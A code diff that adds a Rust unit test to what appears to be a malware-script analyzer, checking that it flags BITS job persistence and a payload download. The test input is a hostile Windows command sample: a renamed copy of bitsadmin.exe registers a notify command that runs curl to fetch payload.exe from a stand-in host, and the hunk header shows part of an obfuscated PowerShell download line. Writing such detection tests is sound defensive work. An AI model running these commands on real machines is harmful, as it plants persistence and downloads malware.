@@ -42874,6 +42874,49 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_bitsadmin_notify_alias_in_deob_text_replays_delayed_child() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\bitsadmin.exe C:\Users\Public\ba.tmp
+C:\Users\Public\ba.tmp /SetNotifyCmdLine job1 "%COMSPEC%" "/V:ON /c set U=https://copied-bits-notify.example/payload.exe&&curl -o payload.exe ^!U^!"
+"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Persistence {
+                        hive,
+                        key,
+                        value_name,
+                        command,
+                    } if hive == "BITS"
+                        && key == "job1"
+                        && value_name == "SetNotifyCmdLine"
+                        && command == r#"C:\WINDOWS\system32\cmd.exe /V:ON /c set U=https://copied-bits-notify.example/payload.exe&&curl -o payload.exe !U!"#
+                )
+            }),
+            "copied bitsadmin notify alias did not emit persistence: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download {
+                        src,
+                        dst: Some(dst),
+                        ..
+                    } if src == "https://copied-bits-notify.example/payload.exe"
+                        && dst == "payload.exe"
+                )
+            }),
+            "copied bitsadmin notify child was not recursively analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_certreq_alias_in_deob_text_emits_config_url_argument() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
